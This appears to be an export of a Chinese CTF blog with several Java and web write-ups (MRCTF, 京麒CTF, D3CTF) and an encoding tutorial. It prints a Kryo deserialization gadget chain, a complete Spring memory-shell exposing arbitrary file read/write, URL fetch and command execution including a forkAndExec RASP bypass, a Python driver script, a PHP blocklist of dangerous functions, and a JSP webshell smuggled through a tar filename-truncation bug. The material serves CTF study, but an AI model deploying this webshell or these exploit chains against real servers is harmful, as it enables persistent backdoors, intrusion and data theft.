keyPairGenerator = KeyPairGenerator.getInstance(&quot;DSA&quot;);        keyPairGenerator.initialize(1024);        KeyPair keyPair = keyPairGenerator.genKeyPair();        PrivateKey privateKey = keyPair.getPrivate();        Signature signingEngine = Signature.getInstance(&quot;DSA&quot;);        SignedObject signedObject = new SignedObject(hashMap1,privateKey,signingEngine);//        signedObject.getObject();        ToStringBean toStringBean2 = new ToStringBean(SignedObject.class, signedObject);        HotSwappableTargetSource h1 = new HotSwappableTargetSource(toStringBean2);        // 为防止 put 时提前命令执行，这里先不设置，随便 new 一个 HashMap 做参数        HotSwappableTargetSource h2 = new HotSwappableTargetSource(new HashMap&lt;&gt;());        HashMap&lt;Object, Object&gt; hashMap2 = new HashMap&lt;&gt;();        hashMap2.put(h1, &quot;test1&quot;);        hashMap2.put(h2, &quot;test2&quot;);        // 反射设置 this.target 为 XString 对象        setFieldValue(h2, &quot;target&quot;, new XString(&quot;test&quot;));        setFieldValue(toStringBean2, &quot;obj&quot;, signedObject);        setFieldValue(toStringBean2, &quot;beanClass&quot;, SignedObject.class);        ByteArrayOutputStream baos = new ByteArrayOutputStream();        Output output = new Output(baos);        this.kryo.writeClassAndObject(output, hashMap2);        output.close();        return new String(Base64.getEncoder().encode(baos.toByteArray()));    &#125;    public void deser(String s)&#123;        ByteArrayInputStream bais = new ByteArrayInputStream(Base64.getDecoder().decode(s));        Input input = new Input(bais);        this.kryo.readClassAndObject(input);    &#125;    public static void main(String[] args) throws Exception &#123;        KryoSer kryoSer = new KryoSer();        String raw = &quot;&#123;\\&quot;polish\\&quot;:true,\\&quot;References\\&quot;: True,\\&quot;RegistrationRequired\\&quot;:false,\\&quot;InstantiatorStrategy\\&quot;: \\&quot;org.objenesis.strategy.StdInstantiatorStrategy\\&quot;&#125;&quot;;        String ser = kryoSer.ser(raw);        new FileOutputStream(&quot;D:\\\\tmp\\\\payload.txt&quot;).write(ser.getBytes());//        kryoSer.deser(ser);    &#125;    public static void setFieldValue(Object obj, String fieldName, Object value) throws IllegalAccessException &#123;        Class&lt;?&gt; aClass = obj.getClass();        Field field = null;        while (aClass != null) &#123;            try&#123;                field = aClass.getDeclaredField(fieldName);                break;            &#125; catch (NoSuchFieldException e) &#123;                aClass = aClass.getSuperclass();            &#125;        &#125;        field.setAccessible(true);        field.set(obj, value);    &#125;&#125;\n\n\n\n内存马编写第一次自己写内存马用，当时也是出了很多问题，不过后来也是跟着文章搞好了\nLandGrey’s Blog\nSpring内存马学习 | Bmth’s blog\n跟着这两篇文章写好了，主要是SpringBoot以2.6.0为分界，Controller的注册方法有点不一样。成功以后自己再去加各种功能就很方便了，这里展示的是最完整的内存马：\npackage memshell;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import org.apache.tomcat.util.http.fileupload.IOUtils;import org.springframework.web.context.WebApplicationContext;import org.springframework.web.context.request.RequestContextHolder;import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;import org.springframework.web.servlet.mvc.method.RequestMappingInfo;import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;import sun.misc.Unsafe;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.*;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;import java.net.URL;import java.nio.file.Files;import java.nio.file.Paths;import java.util.Base64;//Memshell when SpringBoot&gt;=2.6.0public class SpringBootController_Higher2_6_0 extends AbstractTranslet &#123;    static&#123;        try &#123;            System.out.println(&quot;start static SpringBootController_Higher2_6_0&quot;);            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);            Field configField = mappingHandlerMapping.getClass().getDeclaredField(&quot;config&quot;);            configField.setAccessible(true);            RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);            Method declaredMethod = Class.forName(&quot;memshell.SpringBootController_Higher2_6_0&quot;).getDeclaredMethod(&quot;login&quot;, HttpServletRequest.class, HttpServletResponse.class);            RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();            RequestMappingInfo info = RequestMappingInfo.paths(&quot;/shell&quot;).options(config).build();            mappingHandlerMapping.registerMapping(info, Class.forName(&quot;memshell.SpringBootController_Higher2_6_0&quot;).newInstance(), declaredMethod);            System.out.println(&quot;SpringBootController_Higher2_6_0 is been registered&quot;);        &#125; catch (ClassNotFoundException | NoSuchMethodException | InstantiationException | IllegalAccessException |                 NoSuchFieldException e) &#123;            throw new RuntimeException(e);        &#125;    &#125;    public SpringBootController_Higher2_6_0() &#123;        System.out.println(&quot;SpringBootController_Higher2_6_0 no args constructor is been used&quot;);    &#125;    public void login(HttpServletRequest request, HttpServletResponse response) throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException, InstantiationException, IOException, NoSuchMethodException, InvocationTargetException &#123;        try &#123;            PrintWriter writer = response.getWriter();            //任意文件写入            String writePath = request.getParameter(&quot;writePath&quot;);            String writeBytes = request.getParameter(&quot;writeBase64&quot;);            if (writePath != null &amp;&amp; writeBytes != null) &#123;                byte[] decode = Base64.getDecoder().decode(writeBytes);                new FileOutputStream(writePath).write(decode);            &#125;            //文件下载            String filePath = request.getParameter(&quot;file&quot;);            if (filePath != null) &#123;                byte[] bytes = Files.readAllBytes(Paths.get(filePath));                String s = Base64.getEncoder().encodeToString(bytes);                writer.write(s);            &#125;            //读文件，不会触发Runtime等            String urlContent = &quot;&quot;;            String read = request.getParameter(&quot;read&quot;);            if (read != null) &#123;                final URL url = new URL(read);                final BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));                String inputLine = &quot;&quot;;                while ((inputLine = in.readLine()) != null) &#123;                    urlContent = urlContent + inputLine + &quot;\\n&quot;;                &#125;                in.close();                writer.println(urlContent);            &#125;            String arg0 = request.getParameter(&quot;code&quot;);//            命令执行ProcessImpl            if (arg0 != null) &#123;                String o = &quot;&quot;;                java.lang.ProcessBuilder p;                if(System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;win&quot;))&#123;                    p = new java.lang.ProcessBuilder(new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, arg0&#125;);                &#125;else&#123;                    p = new java.lang.ProcessBuilder(new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, arg0&#125;);                &#125;                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter(&quot;\\\\A&quot;);                o = c.hasNext() ? c.next(): o;                c.close();                writer.write(o);                writer.flush();                writer.close();            &#125;            String[] strs = request.getParameterValues(&quot;cmd&quot;);            //通过forkAndExec命令执行            if (strs != null) &#123;                Field theUnsafeField = Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);                theUnsafeField.setAccessible(true);                Unsafe unsafe = (Unsafe) theUnsafeField.get(null);                Class processClass = null;                try &#123;                    processClass = Class.forName(&quot;java.lang.UNIXProcess&quot;);                &#125; catch (ClassNotFoundException e) &#123;                    processClass = Class.forName(&quot;java.lang.ProcessImpl&quot;);                &#125;                Object processObject = unsafe.allocateInstance(processClass);                // Convert arguments to a contiguous block; it&#x27;s easier to do                // memory management in Java than in C.                byte[][] args = new byte[strs.length - 1][];                int size = args.length; // For added NUL bytes                for (int i = 0; i &lt; args.length; i++) &#123;                    args[i] = strs[i + 1].getBytes();                    size += args[i].length;                &#125;                byte[] argBlock = new byte[size];                int i = 0;                for (byte[] arg : args) &#123;                    System.arraycopy(arg, 0, argBlock, i, arg.length);                    i += arg.length + 1;                    // No need to write NUL bytes explicitly                &#125;                int[] envc = new int[1];                int[] std_fds = new int[]&#123;-1, -1, -1&#125;;                Field launchMechanismField = processClass.getDeclaredField(&quot;launchMechanism&quot;);                Field helperpathField = processClass.getDeclaredField(&quot;helperpath&quot;);                launchMechanismField.setAccessible(true);                helperpathField.setAccessible(true);                Object launchMechanismObject = launchMechanismField.get(processObject);                byte[] helperpathObject = (byte[]) helperpathField.get(processObject);                int ordinal = (int) launchMechanismObject.getClass().getMethod(&quot;ordinal&quot;).invoke(launchMechanismObject);                Method forkMethod = processClass.getDeclaredMethod(&quot;forkAndExec&quot;, new Class[]&#123;                        int.class, byte[].class, byte[].class, byte[].class, int.class,                        byte[].class, int.class, byte[].class, int[].class, boolean.class                &#125;);                forkMethod.setAccessible(true);// 设置访问权限                int pid = (int) forkMethod.invoke(processObject, new Object[]&#123;                        ordinal + 1, helperpathObject, toCString(strs[0]), argBlock, args.length,                        null, envc[0], null, std_fds, false                &#125;);                // 初始化命令执行结果，将本地命令执行的输出流转换为程序执行结果的输出流                Method initStreamsMethod = processClass.getDeclaredMethod(&quot;initStreams&quot;, int[].class);                initStreamsMethod.setAccessible(true);                initStreamsMethod.invoke(processObject, std_fds);                // 获取本地执行结果的输入流                Method getInputStreamMethod = processClass.getMethod(&quot;getInputStream&quot;);                getInputStreamMethod.setAccessible(true);                InputStream in = (InputStream) getInputStreamMethod.invoke(processObject);                ByteArrayOutputStream baos = new ByteArrayOutputStream();                int a = 0;                byte[] b = new byte[1024];                while ((a = in.read(b)) != -1) &#123;                    baos.write(b, 0, a);                &#125;                writer.write(baos.toString());            &#125;        &#125; catch (IOException e) &#123;            throw new RuntimeException(e);        &#125; catch (NoSuchFieldException e) &#123;            throw new RuntimeException(e);        &#125; catch (SecurityException e) &#123;            throw new RuntimeException(e);        &#125; catch (IllegalArgumentException e) &#123;            throw new RuntimeException(e);        &#125; catch (IllegalAccessException e) &#123;            throw new RuntimeException(e);        &#125; catch (ClassNotFoundException e) &#123;            throw new RuntimeException(e);        &#125; catch (InstantiationException e) &#123;            throw new RuntimeException(e);        &#125; catch (InvocationTargetException e) &#123;            throw new RuntimeException(e);        &#125; catch (NoSuchMethodException e) &#123;            throw new RuntimeException(e);        &#125;    &#125;    public static byte[] toCString(String s) &#123;        if (s == null)            return null;        byte[] bytes  = s.getBytes();        byte[] result = new byte[bytes.length + 1];        System.arraycopy(bytes, 0,                result, 0,                bytes.length);        result[result.length - 1] = (byte) 0;        return result;    &#125;    @Override    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;    &#125;    @Override    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;    &#125;&#125;\n\n一开始其实注入的就是一个最普通的内存马，后来发现没法执行命令。于是增加了目录和文件读取的功能，通过read&#x3D;file:&#x2F;&#x2F;&#x2F;这样的伪协议形式读。然后会发现虽然能知道flag就在根目录下，但是由于权限原因没法直接读取（看dockerfile知道的）。查看app目录，发现有jrasp.jar，再给内存马加功能，把rasp下载下来（读base64编码，python脚本再转换）。\nrasp没学的话可以参考文末的几篇文章。这个rasp禁止了ProcessImpl，但是没禁止UnixProcess，所以我们可以直接通过UnixProcess去执行命令。但是我内存马是直接用forkAndExec去执行了，更底层一点。虽然作者的本意是让我们写JNI文件去命令执行的。\n这样注入后就可以执行命令了，通过readFlag去读。但是这个readFlag是一个算术题，也是需要把文件下载，然后写对应的C语言程序与readFlag交互，最后把写好的C语言程序上传并执行。这个计算题的步骤我当时没复现，感觉有点麻烦。\n最后给一下参考的python脚本：\nimport base64import requestsfrom urllib.parse import quotedef upload_jar_file(url, file_path, headers=None):    &quot;&quot;&quot;    上传 .jar 文件到指定 URL    :param url: 目标服务器的 URL    :param file_path: 要上传的 .jar 文件路径    :param headers: 可选的请求头（如身份验证信息）    :return: 返回服务器响应    &quot;&quot;&quot;    # 检查文件是否存在    try:        with open(file_path, &#x27;rb&#x27;) as file:            files = &#123;&#x27;file&#x27;: (file_path, file, &#x27;application/java-archive&#x27;)&#125;            response = requests.post(url, files=files, headers=headers)            return response    except FileNotFoundError:        print(f&quot;Error: File not found at &#123;file_path&#125;&quot;)        return None    except Exception as e:        print(f&quot;Error: &#123;e&#125;&quot;)        return Nonedef post(url, data=None, json=None, headers=None):    response = requests.post(url, data=data, json=json, headers=headers)    print(response.text)def get(url):    response = requests.get(url)    print(response.text)    return response.textdef readTXT(file_path):    with open(file_path, &#x27;r&#x27;) as file:        return file.read()def readBin(file_path):    with open(file_path, &#x27;rb&#x27;) as file:        return file.read()if __name__ == &#x27;__main__&#x27;:    headers = &#123;        &quot;cmd&quot;: &quot;whoami&quot;,        # &quot;Content-Type&quot;: &quot;application/json&quot;        &quot;Accept&quot;: &quot;text/html;charset=fengfff&quot;,    &#125;    payload = readTXT(&quot;D://tmp//payload.txt&quot;)    data = &#123;        &quot;message&quot;: f&quot;&#123;payload&#125;&quot;    &#125;    url = &quot;http://192.168.21.132:8007/coffee/demo&quot;    json_raw = &#123;        &quot;polish&quot;: True,        &quot;References&quot;: True,        &quot;RegistrationRequired&quot;: False,        &quot;InstantiatorStrategy&quot;: &quot;org.objenesis.strategy.StdInstantiatorStrategy&quot;    &#125;    # post(url, json=json_raw)    coffee_json = &#123;        &quot;extraFlavor&quot;: f&quot;&#123;payload&#125;&quot;,        &quot;espresso&quot;: 0.1    &#125;    url2 = &quot;http://192.168.21.132:8007/coffee/order&quot;    # post(url2, json=coffee_json)    bin_base64 = get(&quot;http://192.168.21.132:8007/shell?file=/app/jrasp.jar&quot;)    output_path = &quot;D://tmp//jrasp.jar&quot;    with open(output_path, &#x27;wb&#x27;) as file:        decoded_bin = base64.b64decode(bin_base64)        file.write(decoded_bin)    flag = readBin(&quot;D://flag&quot;)    bwriteBase64 = base64.b64encode(flag)    writeBase64 = bwriteBase64.decode(&quot;utf-8&quot;)    writePath = &quot;/fllag&quot;    get(f&quot;http://192.168.21.132:8007/shell?writePath=&#123;writePath&#125;&amp;writeBase64=&#123;writeBase64&#125;&quot;)\n\n\n\n总结这道题对我来说主要就是实践了一下内存马和rasp绕过，另外还有高版本kryo的绕过。题目很难，大佬们是真厉害\n参考wp：\n2022MRCTF-Java部分\nMRCTF 2022 By W&amp;M - W&amp;M Team\nRASP绕过初探 | Bmth’s blog\nEkiXu&#x2F;My-CTF-Challenge\nkryo：\n[浅析Dubbo Kryo&#x2F;FST反序列化漏洞（CVE-2021-25641）  Mi1k7ea ]\n内存马：\nSpring内存马学习 | Bmth’s blog\nLandGrey’s Blog\nJavaAgent与Rasp：\n浅谈 Java Agent 内存马 – 天下大木头\nJava Agent 内存马学习 | Drunkbaby’s Blog\n[本地命令执行漏洞 · 攻击Java Web应用-Java Web安全]\n文章 - JAVA安全之命令执行研究分析 - 先知社区\n[JNI攻击 · 攻击Java Web应用-Java Web安全]\nJava 反序列化绕过 RASP - DumKiy’s blog\n[java Rasp 的简单实现与绕过 - Ko1sh1’s Blog](https://ko1sh1.github.io/2024/03/25/blog_java Rasp的实现与绕过&#x2F;#JNI-绕过RASP-执行命令)\n","categories":["CTF-Java"],"tags":["Java安全","CTF-Java"]},{"title":"京麒CTF25-热身Web","url":"/2025/05/22/%E4%BA%AC%E9%BA%92CTF25-%E7%83%AD%E8%BA%ABWeb/","content":"Execute考命令执行\n先看一下php版本，这里可以直接执行代码：\n是php7，那么我们知道，这里是支持这种函数执行方式的：\n$a = &quot;system&quot;;$a(&#x27;ls&#x27;);\n\n试了一下，直接成功了：\n可以看一下题目的过滤逻辑：\n&lt;?phpheader(&#x27;Content-Type: text/html; charset=utf-8&#x27;);$max_execution_time = 5;$memory_limit = &#x27;128M&#x27;;$disabled_functions = [    &#x27;exec&#x27;, &#x27;passthru&#x27;, &#x27;shell_exec&#x27;, &#x27;system&#x27;, &#x27;proc_open&#x27;, &#x27;popen&#x27;,    &#x27;curl_exec&#x27;, &#x27;curl_multi_exec&#x27;, &#x27;parse_ini_file&#x27;, &#x27;show_source&#x27;,    &#x27;pcntl_exec&#x27;, &#x27;posix_kill&#x27;, &#x27;posix_mkfifo&#x27;, &#x27;posix_setpgid&#x27;,    &#x27;posix_setsid&#x27;, &#x27;posix_setuid&#x27;, &#x27;posix_setgid&#x27;, &#x27;posix_uname&#x27;,    &#x27;dl&#x27;, &#x27;openlog&#x27;, &#x27;syslog&#x27;, &#x27;closelog&#x27;];ini_set(&#x27;max_execution_time&#x27;, $max_execution_time);ini_set(&#x27;memory_limit&#x27;, $memory_limit);$code = isset($_POST[&#x27;code&#x27;]) ? $_POST[&#x27;code&#x27;] : &#x27;&#x27;;if (empty($code)) &#123;    die(&#x27;错误: 没有提供PHP代码&#x27;);&#125;foreach ($disabled_functions as $func) &#123;    if (preg_match(&#x27;/\\b&#x27; . preg_quote($func, &#x27;/&#x27;) . &#x27;\\s*\\(/i&#x27;, $code)) &#123;        die(&quot;安全错误: 不允许使用 &#123;$func&#125;() 函数&quot;);    &#125;&#125;$dangerous_patterns = [    &#x27;/`.*`/&#x27;,                          // 反引号执行    &#x27;/eval\\s*\\(/i&#x27;,                    // eval函数    &#x27;/create_function\\s*\\(/i&#x27;,         // create_function    &#x27;/include\\s*\\(/i&#x27;,                 // include    &#x27;/require\\s*\\(/i&#x27;,                 // require    &#x27;/include_once\\s*\\(/i&#x27;,            // include_once    &#x27;/require_once\\s*\\(/i&#x27;,            // require_once    &#x27;/file_put_contents\\s*\\(/i&#x27;,       // 文件写入    &#x27;/file_get_contents\\s*\\(/i&#x27;,       // 文件读取    &#x27;/unlink\\s*\\(/i&#x27;,                  // 文件删除    &#x27;/phpinfo\\s*\\(/i&#x27;,                 // phpinfo    &#x27;/chmod\\s*\\(/i&#x27;,                   // 修改权限    &#x27;/chown\\s*\\(/i&#x27;,                   // 修改所有者    &#x27;/chgrp\\s*\\(/i&#x27;,                   // 修改组    &#x27;/putenv\\s*\\(/i&#x27;,                  // 环境变量    &#x27;/ini_set\\s*\\(/i&#x27;,                 // 修改INI设置    &#x27;/extract\\s*\\(/i&#x27;,                 // extract    &#x27;/parse_str\\s*\\(/i&#x27;,               // parse_str    &#x27;/assert\\s*\\(/i&#x27;,                  // assert    &#x27;/preg_replace\\s*\\(.*\\/e.*\\)/i&#x27;,   // preg_replace /e修饰符    &#x27;/proc_terminate\\s*\\(/i&#x27;,          // 进程终止    &#x27;/pcntl_fork\\s*\\(/i&#x27;,              // 进程控制    &#x27;/posix_getpwuid\\s*\\(/i&#x27;,          // 获取用户信息    &#x27;/posix_kill\\s*\\(/i&#x27;,              // 发送信号    &#x27;/posix_setuid\\s*\\(/i&#x27;,            // 设置UID    &#x27;/posix_setgid\\s*\\(/i&#x27;             // 设置GID];foreach ($dangerous_patterns as $pattern) &#123;    if (preg_match($pattern, $code)) &#123;        die(&quot;安全错误: 检测到潜在的危险操作&quot;);    &#125;&#125;ob_start();$old_error_reporting = error_reporting(E_ALL);$old_display_errors = ini_set(&#x27;display_errors&#x27;, &#x27;1&#x27;);try &#123;    eval(&#x27;?&gt;&#x27; . $code);&#125; catch (ParseError $e) &#123;    echo &quot;解析错误: &quot; . $e-&gt;getMessage() . &quot;\\n&quot;;    echo &quot;位于行: &quot; . $e-&gt;getLine() . &quot;\\n&quot;;&#125; catch (Throwable $e) &#123;    echo &quot;运行时错误: &quot; . $e-&gt;getMessage() . &quot;\\n&quot;;    echo &quot;位于行: &quot; . $e-&gt;getLine() . &quot;\\n&quot;;&#125;error_reporting($old_error_reporting);ini_set(&#x27;display_errors&#x27;, $old_display_errors);$output = ob_get_clean();$sensitive_patterns = [    &#x27;/\\/home\\/.*/i&#x27;,    &#x27;/\\/var\\/www\\/.*/i&#x27;,    &#x27;/\\[internal function\\]/i&#x27;];foreach ($sensitive_patterns as $pattern) &#123;    $output = preg_replace($pattern, &#x27;[隐藏信息]&#x27;, $output);&#125;echo htmlspecialchars($output, ENT_QUOTES, &#x27;UTF-8&#x27;);?&gt;\n\n大概就是通过 ‘system(‘这样的匹配规则来过滤。最底下还会对输出中的敏感目录进行过滤。\nEzlogin可以通过插件或者cookie来判断是一道Java。\n扫一下目录，发现有&#x2F;actuator泄露。简单看一下mapping，env，能发现是一个8u111的环境。\n然后开始用heapdump，先getfile看一下依赖：\n可以看到有shiro和cc3.2.1，下面还有一个cb1.9.4\n查一下shirokey，上面图片最顶上其实已经查了。\n那接下来用java-chain工具一把梭就行。\n记得把GCM模式打开。\n带上cookie，发包即可。不过这里好像对header长度有限制，我生成内存马直接报错了。\nCookie: rememberMe&#x3D; 6ZAFnvTDGFQNmw2R2x4S8+bF。。。\n总结题目比较简单，但是题目的环境都挺好的，看着很舒服。\n","categories":["CTF-Java"],"tags":["CTF-Java"]},{"title":"D3CTF-d3jtar","url":"/2025/06/01/D3CTF-d3jtar/","content":"比赛的时候没做出来，现在来复现一下。\n在TarHeader类中有两个方法，负责对文件名进行解析。\n这个是压缩时的方法：\npublic static int getNameBytes(StringBuffer name, byte[] buf, int offset, int length) &#123;\tint i;\tfor (i = 0; i &lt; length &amp;&amp; i &lt; name.length(); ++i) &#123;\t\tbuf[offset + i] = (byte) name.charAt(i);\t&#125;\tfor (; i &lt; length; ++i) &#123;\t\tbuf[offset + i] = 0;\t&#125;\treturn offset + length;&#125;\n\n\n\n这个是解压时的方法：\npublic static StringBuffer parseName(byte[] header, int offset, int length) &#123;    StringBuffer result = new StringBuffer(length);    int end = offset + length;    for (int i = offset; i &lt; end; ++i) &#123;       if (header[i] == 0)          break;       result.append((char) header[i]);    &#125;    return result;&#125;\n\n\n\n这里重点关注一下压缩时的方法。可以看到，这里对文件名name，进行了 (byte) name.charAt(i) 操作。name.charAt()得到是char类型数据，占16位，默认实现UTF-16，是Unicode码点序列。而byte类型只占8位。这就导致name中的中文在转化成byte类型时，会丢失高位部分。因此，现在要做的就是找到一个Unicode字符，其丢失高位后与jsp中的任意一个字符相同。\n这里以 j 为例。\npackage solution;public class Test &#123;    public static void main(String[] args) &#123;        StringBuffer name = new StringBuffer();        name.append(&quot;你abc123&quot;);        char c = name.charAt(0);        System.out.println(c);        System.out.println((byte) c);        System.out.println((byte) &#x27;j&#x27;);        unicodeSearch();    &#125;    public static void unicodeSearch()&#123;        int count = 0;        for (int codePoint = Character.MIN_CODE_POINT; codePoint &lt;= Character.MAX_CODE_POINT; codePoint++) &#123;            if (!Character.isDigit(codePoint)) &#123;                continue;            &#125;            String s = new String(Character.toChars(codePoint));            char c = s.charAt(0);            if ((byte) c == 106)&#123;                System.out.println(String.format(&quot;%c: U+%04X%n&quot;, c, codePoint));            &#125;        &#125;    &#125;&#125;\n\npython脚本也行：\nif __name__ == &quot;__main__&quot;:    for i in range(0x0000, 0xFFFF+1):        hex_str = format(i, &quot;04x&quot;)        last2 = hex_str[-2:]        char_old = chr(int(hex_str, 16))        char_new = chr(int(last2, 16))        if char_new == &#x27;j&#x27;:            print(f&quot;&#123;char_old&#125;丢失高位后变成：&#123;char_new&#125;&quot;)\n\n找到一些能用的字符\nŪ(\\u016a)丢失高位后变成：j\nɪ(\\u026a)丢失高位后变成：j\nͪ(\\u036a)丢失高位后变成：j\nѪ(\\u046a)丢失高位后变成：j\nժ(\\u056a)丢失高位后变成：j\n٪(\\u066a)丢失高位后变成：j\nݪ(\\u076a)丢失高位后变成：j\nࡪ(\\u086a)丢失高位后变成：j\n४(\\u096a)丢失高位后变成：j\n创建jsp马即可：\npackage solution;import java.io.FileNotFoundException;import java.io.FileOutputStream;import java.io.IOException;public class WriteJsp &#123;    public static void main(String[] args) throws IOException &#123;        FileOutputStream fos = new FileOutputStream(&quot;shell.\\u096Asp&quot;);        fos.write((&quot;&lt;%@ page import=\\&quot;java.io.InputStream\\&quot; %&gt;\\n&quot; +                &quot;&lt;%@ page import=\\&quot;java.util.Scanner\\&quot; %&gt;&lt;%\\n&quot; +                &quot;    Process env = Runtime.getRuntime().exec(\\&quot;env\\&quot;);\\n&quot; +                &quot;    InputStream inputStream = env.getInputStream();\\n&quot; +                &quot;    Scanner scanner = new Scanner(inputStream).useDelimiter(\\&quot;\\\\\\\\A\\&quot;);\\n&quot; +                &quot;    String s = scanner.hasNext() ? scanner.next() : \\&quot;\\&quot;;\\n&quot; +                &quot;    out.print(s);\\n&quot; +                &quot;%&gt;&quot;).getBytes());    &#125;&#125;","categories":["CTF-Java"],"tags":["CTF-Java"]},{"title":"编码方式学习","url":"/2025/06/03/%E7%BC%96%E7%A0%81%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/","content":"前言学一下utf8等编码方式。\n相信大家都接触过乱码文本，就是锟斤拷之类的，这个就是由编码问题导致的。而编码问题的本质，就是用不同的方式读同一段字节，有些可能两个两个字节读，有些可能四个四个字节读。\n在CTF里，遇到过UTF8 Overlong Encoding 绕过，也遇到过由于高字节丢弃产生的绕过，但由于对缺乏对编码的知识，所以不是很理解，因此现在来学习一下。\nUTF8UTF-8 是一种可变长度的 Unicode 编码方式，使用 1~4 个字节 表示一个字符，兼容 ASCII，并广泛用于互联网和文件存储。它的设计目标是节省空间（英文字符仅需 1 字节），同时支持所有 Unicode 字符（包括中文、emoji 等）。\n\nUTF-8 的编码规则UTF-8 的编码方式根据 Unicode 码点（Code Point）的范围，采用不同长度的字节序列：\n\n\n\nUnicode 码点范围（十六进制）\n码点位数\nUTF-8 字节序列格式（二进制）\n字节数\n示例\n\n\n\nU+0000 ~ U+007F\n7 bits\n0xxxxxxx\n1\n&#39;A&#39; (0x41)\n\n\nU+0080 ~ U+07FF\n11 bits\n110xxxxx 10xxxxxx\n2\n&#39;é&#39; (0xC3A9)\n\n\nU+0800 ~ U+FFFF\n16 bits\n1110xxxx 10xxxxxx 10xxxxxx\n3\n&#39;你&#39; (0xE4BDA0)\n\n\nU+10000 ~ U+10FFFF\n21 bits\n11110xxx 10xxxxxx 10xxxxxx 10xxxxxx\n4\n&#39;𠀀&#39; (0xF0A08080)\n\n\n编码步骤\n确定码点范围 → 选择对应的 UTF-8 字节格式。\n将 Unicode 码点转换为二进制，填充到 UTF-8 的模板中。\n转换为十六进制字节，得到最终的 UTF-8 编码。\n\n\n示例：&#39;你&#39; 的 UTF-8 编码1. 获取 Unicode 码点ord(&#x27;你&#x27;)  # 20320（十进制） → 十六进制 `U+4F60`\n\n2. 确定 UTF-8 编码格式U+4F60 属于 U+0800 ~ U+FFFF 范围 → 3 字节，格式：\n1110xxxx 10xxxxxx 10xxxxxx\n\n3. 将 U+4F60 转换为二进制4F60 (十六进制) → 0100 1111 0110 0000 (二进制)\n\n4. 填充 UTF-8 模板码点二进制：0100 111101 100000填充模板：1110xxxx 10xxxxxx 10xxxxxx结果：1110**0100** 10**111101** 10**100000**\n\n5. 转换为十六进制11100100 → 0xE410111101 → 0xBD10100000 → 0xA0\n\n最终 UTF-8 编码：\\xE4\\xBD\\xA0（3 字节）\nPython 验证&#x27;你&#x27;.encode(&#x27;utf-8&#x27;)  # b&#x27;\\xe4\\xbd\\xa0&#x27;\n\n\nUTF-8 的特点\n兼容 ASCII：U+0000~U+007F 的字符（如 &#39;A&#39;）编码与 ASCII 完全相同（1 字节）。\n无字节序问题：UTF-8 的字节顺序固定，无需 BOM（但某些编辑器可能添加 EF BB BF 作为标记）。\n空间高效：\n\n\n\n英文：1 字节（ASCII 兼容）。\n欧洲字符：2 字节（如 &#39;é&#39;）。\n中文&#x2F;日文：3 字节（如 &#39;你&#39;）。\n生僻字&#x2F;emoji：4 字节（如 &#39;𠀀&#39;）。\n\n\n\nUTF16UTF-16 是一种定长或变长的 Unicode 编码方式，使用 2 或 4 字节 表示一个字符。它的核心特点是：\n\n基本多文种平面（BMP）字符（U+0000 ~ U+FFFF）用 2 字节 直接存储。\n辅助平面字符（U+10000 ~ U+10FFFF）用 4 字节（代理对，Surrogate Pair）存储。\n\n\nUTF-16 的编码规则1. 基本多文种平面（BMP，2 字节）\n范围：U+0000 ~ U+FFFF（不包括代理区 U+D800 ~ U+DFFF）。\n\n直接存储：码点数值直接转为 2 字节。\n\n\n示例：\n\n\n\n\n&#39;A&#39;（U+0041）→ 0x0041（大端：00 41，小端：41 00）\n&#39;你&#39;（U+4F60）→ 0x4F60（大端：4F 60，小端：60 4F）\n\n\n\n\n\n辅助平面这个略看一下就行。\n2. 辅助平面（4 字节，代理对）\n范围：U+10000 ~ U+10FFFF（如 emoji &#39;𠀀&#39; U+20000）。\n代理对计算：\n\n\n\n码点减去 0x10000，得到 20 位中间值。\n高 10 位 + 0xD800 → 高位代理（High Surrogate）。\n低 10 位 + 0xDC00 → 低位代理（Low Surrogate）。\n\n\n\n\n\n示例：\n\n\n\n# 计算 &#x27;𠀀&#x27;（U+20000）的 UTF-16 代理对code_point = 0x20000temp = code_point - 0x10000  # 0x10000high_surrogate = (temp &gt;&gt; 10) + 0xD800  # 0xD840low_surrogate = (temp &amp; 0x3FF) + 0xDC00  # 0xDC00# 最终代理对：0xD840 0xDC00\n\n\n字节序（大端 vs 小端）UTF-16 的 2 字节或 4 字节序列需要明确字节序：\n\n大端（BE）：高位字节在前（如 0x4F60 → 4F 60）。\n\n小端（LE）：低位字节在前（如 0x4F60 → 60 4F）。\n\nBOM（字节顺序标记）：\n\n\n0xFEFF（大端 BOM，存储为 FE FF）。\n0xFFFE（小端 BOM，存储为 FF FE）。\n\n\n\n\nPython 示例这里遇到过一个坑，python如果只指定utf16，输出是带BOM的，当时不知道，一直想不明白为什么会输出四个字节。\n# 默认 UTF-16（带 BOM，小端）print(&#x27;你&#x27;.encode(&#x27;utf-16&#x27;))  # b&#x27;\\xff\\xfe\\x60\\x4f&#x27;（BOM + 小端）# 显式指定大端（无 BOM）print(&#x27;你&#x27;.encode(&#x27;utf-16be&#x27;))  # 